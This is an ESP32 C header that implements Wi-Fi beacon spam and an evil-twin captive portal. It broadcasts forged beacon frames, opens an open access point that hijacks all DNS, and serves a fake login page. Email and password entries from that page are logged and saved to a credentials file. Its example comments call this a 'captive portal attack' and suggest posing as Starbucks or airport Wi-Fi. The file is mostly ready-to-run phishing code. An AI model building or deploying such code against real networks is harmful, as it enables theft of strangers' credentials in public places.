
// wifi_helpers.h - Easy WiFi Beacon & Captive Portal Interface
#ifndef WIFI_HELPERS_H
#define WIFI_HELPERS_H
#include <sys/stat.h>
#include <stdint.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_netif.h"
#include "esp_http_server.h"
#include "dns_server.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <stdint.h>
#include <string.h>
#include "esp_random.h"





#define MAX_KARMA_SSIDS 50
#define KARMA_SSID_LEN 32

static const char *KARMA_TAG = "WiFi_Karma";
static const char *WIFI_HELPERS_TAG = "WiFi_Helpers";

// ============================================================================
// BEACON TRANSMISSION
// ============================================================================

typedef struct {
    char ssid[33];
    uint8_t mac[6];
    uint8_t channel;
    uint8_t active;
} BeaconConfig;

static BeaconConfig active_beacons[20];
static uint8_t beacon_count = 0;
static TaskHandle_t beacon_task_handle = NULL;
static uint8_t beacon_system_running = 0;

// Generate random MAC address (locally administered)
static inline void generate_random_mac(uint8_t *mac) {
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;  // Locally administered, unicast
}

// Send a single beacon frame
static void send_beacon_frame(const char *ssid, const uint8_t *mac, uint8_t channel) {
    uint8_t packet[128];
    uint16_t pos = 0;
    
    // MAC header
    packet[pos++] = 0x80; packet[pos++] = 0x00;  // Frame Control: Beacon
    packet[pos++] = 0x00; packet[pos++] = 0x00;  // Duration
    memset(&packet[pos], 0xFF, 6); pos += 6;      // Destination: broadcast
    memcpy(&packet[pos], mac, 6); pos += 6;       // Source
    memcpy(&packet[pos], mac, 6); pos += 6;       // BSSID
    
    static uint16_t seq = 0;
    packet[pos++] = (seq & 0x0F) << 4;
    packet[pos++] = (seq >> 4) & 0xFF;
    seq++;
    
    // Fixed parameters
    uint64_t ts = esp_timer_get_time();
    memcpy(&packet[pos], &ts, 8); pos += 8;
    packet[pos++] = 0x64; packet[pos++] = 0x00;  // Beacon interval
    packet[pos++] = 0x21; packet[pos++] = 0x04;  // Capability
    
    // SSID tag
    size_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    packet[pos++] = 0x00;
    packet[pos++] = ssid_len;
    memcpy(&packet[pos], ssid, ssid_len); pos += ssid_len;
    
    // Supported Rates
    packet[pos++] = 0x01; packet[pos++] = 0x08;
    packet[pos++] = 0x82; packet[pos++] = 0x84;
    packet[pos++] = 0x8B; packet[pos++] = 0x96;
    packet[pos++] = 0x24; packet[pos++] = 0x30;
    packet[pos++] = 0x48; packet[pos++] = 0x6C;
    
    // DS Parameter Set
    packet[pos++] = 0x03; packet[pos++] = 0x01;
    packet[pos++] = channel;
    
    esp_wifi_80211_tx(WIFI_IF_AP, packet, pos, false);
}

// Beacon broadcast task
static void beacon_broadcast_task(void *param) {
    ESP_LOGI(WIFI_HELPERS_TAG, "Beacon broadcast task started");
    
    while (beacon_system_running) {
        for (uint8_t i = 0; i < beacon_count; i++) {
            if (active_beacons[i].active) {
                // Set channel
                esp_wifi_set_channel(active_beacons[i].channel, WIFI_SECOND_CHAN_NONE);
                
                // Send beacon
                send_beacon_frame(
                    active_beacons[i].ssid,
                    active_beacons[i].mac,
                    active_beacons[i].channel
                );
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(100));  // Beacon interval
    }
    
    beacon_task_handle = NULL;
    vTaskDelete(NULL);
}

/**
 * @brief Initialize the beacon system
 * @return 1 on success, 0 on failure
 */
static inline uint8_t beacon_system_init(void) {
    static uint8_t wifi_init_done = 0;
    
    if (!wifi_init_done) {
        esp_err_t err;
        err = esp_netif_init();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
        
        err = esp_event_loop_create_default();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
        
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        ESP_ERROR_CHECK(esp_wifi_init(&cfg));
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
        
        wifi_config_t ap_cfg = {0};
        ap_cfg.ap.channel = 6;
        ap_cfg.ap.max_connection = 0;
        ap_cfg.ap.ssid_hidden = 1;
        ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_cfg));
        
        ESP_ERROR_CHECK(esp_wifi_start());
        esp_wifi_set_max_tx_power(84);  // Max power
        
        wifi_init_done = 1;
    }
    
    if (!beacon_system_running) {
        beacon_system_running = 1;
        xTaskCreate(beacon_broadcast_task, "beacon_task", 4096, NULL, 5, &beacon_task_handle);
    }
    
    return 1;
}

/**
 * @brief Create and broadcast a beacon
 * @param ssid Network name to broadcast
 * @return Beacon index (0-19), or 255 on failure
 * 
 * Example:
 *   make_beacon("Free WiFi");
 *   make_beacon("FBI Surveillance Van");
 */
static inline uint8_t make_beacon(const char *ssid) {
    if (beacon_count >= 20) {
        ESP_LOGE(WIFI_HELPERS_TAG, "Beacon limit reached (20 max)");
        return 255;
    }
    
    beacon_system_init();
    
    strncpy(active_beacons[beacon_count].ssid, ssid, 32);
    active_beacons[beacon_count].ssid[32] = '\0';
    generate_random_mac(active_beacons[beacon_count].mac);
    active_beacons[beacon_count].channel = 6;
    active_beacons[beacon_count].active = 1;
    
    ESP_LOGI(WIFI_HELPERS_TAG, "Created beacon: %s", ssid);
    
    return beacon_count++;
}

/**
 * @brief Stop broadcasting a specific beacon
 * @param index Beacon index returned from make_beacon()
 */
static inline void stop_beacon(uint8_t index) {
    if (index < beacon_count) {
        active_beacons[index].active = 0;
        ESP_LOGI(WIFI_HELPERS_TAG, "Stopped beacon: %s", active_beacons[index].ssid);
    }
}

/**
 * @brief Stop all beacons
 */
static inline void stop_all_beacons(void) {
    beacon_system_running = 0;
    beacon_count = 0;
    
    // Wait for task to finish
    uint8_t wait = 0;
    while (beacon_task_handle && wait++ < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    ESP_LOGI(WIFI_HELPERS_TAG, "All beacons stopped");
}

// ============================================================================
// CAPTIVE PORTAL
// ============================================================================

static httpd_handle_t portal_http_server = NULL;
static dns_server_handle_t portal_dns_server = NULL;
static char portal_ap_ssid[33] = {0};
static uint8_t portal_active = 0;

// Default captive portal HTML
static const char *default_portal_html = 
    "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>WiFi Login</title><style>"
    "body{font-family:-apple-system,sans-serif;max-width:400px;margin:50px auto;padding:20px;background:#f5f5f5}"
    "h2{text-align:center}input{width:100%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:6px;font-size:16px}"
    "button{width:100%;padding:14px;background:#007bff;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer}"
    "button:hover{background:#0056b3}"
    ".c{background:#fff;padding:30px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,.1)}"
    "</style></head><body><div class='c'><h2>Connect to WiFi</h2>"
    "<form method='POST' action='/submit'>"
    "<input name='email' placeholder='Email' required>"
    "<input type='password' name='password' placeholder='Password' required>"
    "<button type='submit'>Connect</button></form></div></body></html>";

// Portal page handler
static esp_err_t portal_page_handler1(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, default_portal_html, strlen(default_portal_html));
    return ESP_OK;
}
#include "nvs_flash.h"
#include "esp_spiffs.h"
// Submit handler (captures credentials)
static esp_err_t portal_submit_handler1(httpd_req_t *req) {
     char buf[512];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    buf[ret] = 0;

    char email[128] = {0}, password[128] = {0};
    char *p;
    if ((p = strstr(buf, "email=")) != NULL) {
        p += 6;
        char *e = strchr(p, '&');
        if (!e) e = p + strlen(p);
        int l = e - p;
        if (l > 127) l = 127;
        strncpy(email, p, l);
    }
    if ((p = strstr(buf, "password=")) != NULL) {
        p += 9;
        char *e = strchr(p, '&');
        if (!e) e = p + strlen(p);
        int l = e - p;
        if (l > 127) l = 127;
        strncpy(password, p, l);
    }
    
    // Log captured credentials
    ESP_LOGI(WIFI_HELPERS_TAG, "📧 CAPTURED: %s", buf);
      mkdir("/spiffs/captures", 0755);
    FILE *f = fopen("/spiffs/captures/credentials.txt", "a");
    if (f) {
        fprintf(f, "SSID: %s\nEmail: %s\nPassword: %s\n---\n", portal_ap_ssid, email, password);
        fclose(f);
        ESP_LOGI(WIFI_HELPERS_TAG, "Captured: %s / %s", email, password);
    }
    // Send "connecting" response
    const char *resp = 
        "<!DOCTYPE html><html><body style='font-family:sans-serif;text-align:center;padding:60px'>"
        "<h2>Connecting...</h2><p>Please wait.</p>"
        "<script>setTimeout(function(){window.location='/';},3000);</script></body></html>";
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, resp, strlen(resp));
    return ESP_OK;
}

// 404 handler (redirect to portal)
static esp_err_t portal_404_handler1(httpd_req_t *req, httpd_err_code_t err) {
    // Android/iOS captive portal detection
    if (strstr(req->uri, "generate_204") || strstr(req->uri, "gen_204") ||
        strstr(req->uri, "connectivitycheck") || strstr(req->uri, "hotspot-detect")) {
        httpd_resp_set_status(req, "200 OK");
        httpd_resp_set_type(req, "text/html");
        const char *redirect = "<html><head><meta http-equiv='refresh' content='0;url=http://192.168.4.1'></head></html>";
        httpd_resp_send(req, redirect, strlen(redirect));
        return ESP_OK;
    }
    
    // Standard redirect
    httpd_resp_set_status(req, "303 See Other");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1");
    httpd_resp_send(req, "Redirect", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

/**
 * @brief Start a captive portal with automatic AP creation
 * @param ssid Network name to broadcast
 * @return 1 on success, 0 on failure
 * 
 * Example:
 *   captive_portal_start("Starbucks WiFi");
 *   captive_portal_start("Airport_Free_WiFi");
 * 
 * Features:
 * - Creates open WiFi AP
 * - DNS hijacking (all domains redirect to portal)
 * - Automatic captive portal detection (iOS/Android)
 * - Credential capture logged to console
 */
static inline uint8_t captive_portal_start(const char *ssid) {
    if (portal_active) {
        ESP_LOGW(WIFI_HELPERS_TAG, "Portal already running");
        return 0;
    }
    
    strncpy(portal_ap_ssid, ssid, 32);
    portal_ap_ssid[32] = '\0';
    
    ESP_LOGI(WIFI_HELPERS_TAG, "Starting captive portal: %s", ssid);
    
    // Initialize network stack
    esp_err_t err;
    err = esp_netif_init();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
    
    err = esp_event_loop_create_default();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
    
    // Create AP interface
    //esp_netif_create_default_wifi_ap();
    
    // Initialize WiFi
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    
    // Configure AP
    wifi_config_t wifi_config = {
        .ap = {
            .ssid_len = strlen(ssid),
            .max_connection = 8,
            .authmode = WIFI_AUTH_OPEN,
            .channel = 6,
            .beacon_interval = 100,
        },
    };
    strncpy((char *)wifi_config.ap.ssid, ssid, 32);
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    // Start HTTP server
    httpd_config_t http_config = HTTPD_DEFAULT_CONFIG();
    http_config.max_open_sockets = 7;
    http_config.lru_purge_enable = true;
    
    if (httpd_start(&portal_http_server, &http_config) == ESP_OK) {
        // Register handlers
        httpd_uri_t uri_root = {
            .uri = "/",
            .method = HTTP_GET,
            .handler = portal_page_handler1
        };
        httpd_register_uri_handler(portal_http_server, &uri_root);
        
        httpd_uri_t uri_submit = {
            .uri = "/submit",
            .method = HTTP_POST,
            .handler = portal_submit_handler1
        };
        httpd_register_uri_handler(portal_http_server, &uri_submit);
        
        // Register 404 handler for captive portal detection
        httpd_register_err_handler(portal_http_server, HTTPD_404_NOT_FOUND, portal_404_handler1);
    }
    
    // Start DNS server (hijack all domains)
    dns_server_config_t dns_config = DNS_SERVER_CONFIG_SINGLE("*", "WIFI_AP_DEF");
    portal_dns_server = start_dns_server(&dns_config);
    
    portal_active = 1;
    
    ESP_LOGI(WIFI_HELPERS_TAG, "✅ Captive portal active!");
    ESP_LOGI(WIFI_HELPERS_TAG, "   SSID: %s", ssid);
    ESP_LOGI(WIFI_HELPERS_TAG, "   IP: 192.168.4.1");
    ESP_LOGI(WIFI_HELPERS_TAG, "   Credentials will be logged to console");
    
    return 1;
}

/**
 * @brief Stop the captive portal
 */
static inline void captive_portal_stop(void) {
    if (!portal_active) return;
    
    if (portal_dns_server) {
        stop_dns_server(portal_dns_server);
        portal_dns_server = NULL;
    }
    
    if (portal_http_server) {
        httpd_stop(portal_http_server);
        portal_http_server = NULL;
    }
    
    esp_wifi_stop();
    portal_active = 0;
    
    ESP_LOGI(WIFI_HELPERS_TAG, "Portal stopped");
}

/**
 * @brief Check if captive portal is running
 * @return 1 if active, 0 if not
 */
static inline uint8_t captive_portal_is_active(void) {
    return portal_active;
}

// ============================================================================
// COMBINED EXAMPLES
// ============================================================================

/**
 * Example 1: Simple beacon spam
 * 
 * void app_main(void) {
 *     make_beacon("Free WiFi");
 *     make_beacon("FBI Surveillance Van");
 *     make_beacon("Pretty Fly for a WiFi");
 *     make_beacon("404 Network Unavailable");
 *     make_beacon("Martin Router King");
 * }
 */

/**
 * Example 2: Captive portal attack
 * 
 * void app_main(void) {
 *     captive_portal_start("Starbucks WiFi");
 *     
 *     // Portal is now running
 *     // Credentials appear in console as users submit them
 *     
 *     vTaskDelay(pdMS_TO_TICKS(300000));  // Run for 5 minutes
 *     captive_portal_stop();
 * }
 */

/**
 * Example 3: Combined beacon + portal
 * 
 * void app_main(void) {
 *     // Create decoy beacons
 *     make_beacon("Airport WiFi 1");
 *     make_beacon("Airport WiFi 2");
 *     make_beacon("Airport WiFi 3");
 *     
 *     // Start captive portal on realistic SSID
 *     captive_portal_start("Airport_Free_WiFi");
 * }
 */

#endif // WIFI_HELPERS_H
